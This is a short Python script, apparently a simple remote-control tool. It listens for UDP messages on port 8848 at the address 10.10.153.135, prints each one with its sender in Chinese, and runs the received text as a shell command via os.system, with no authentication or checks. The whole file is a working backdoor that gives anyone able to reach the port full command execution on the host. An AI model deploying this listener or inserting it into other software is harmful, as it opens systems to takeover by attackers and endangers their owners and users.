import socket
import os
udpsever=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
udpsever.bind(("10.10.153.135",8848))
while True:
    data,addr=udpsever.recvfrom(1024)
    print("来自",addr,"消息",data)
    os.system(data.decode("utf-8"))

